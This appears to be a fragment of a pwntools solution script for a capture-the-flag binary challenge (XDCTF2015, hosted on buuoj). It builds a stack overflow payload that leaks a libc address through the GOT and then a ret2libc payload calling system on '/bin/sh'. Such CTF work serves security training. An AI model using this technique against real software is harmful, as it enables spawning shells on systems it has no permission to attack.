...
elf = ELF(binary)
io = remote('node4.buuoj.cn',29352) if argv[1]=='r' else process(binary)
...
payload = b'a'* (0x6c+4) + p32(print_fun_plt) + p32(main_addr) + p32(1) + p32(search_fun_got) + p32(4) #根据选择的print_fun改变参数
...
payload1 = b'a' * (0x6c+4) + p32(system_addr) + p32(1234) + p32(binsh_addr)
io.recvuntil(b"Welcome to XDCTF2015~!\n")
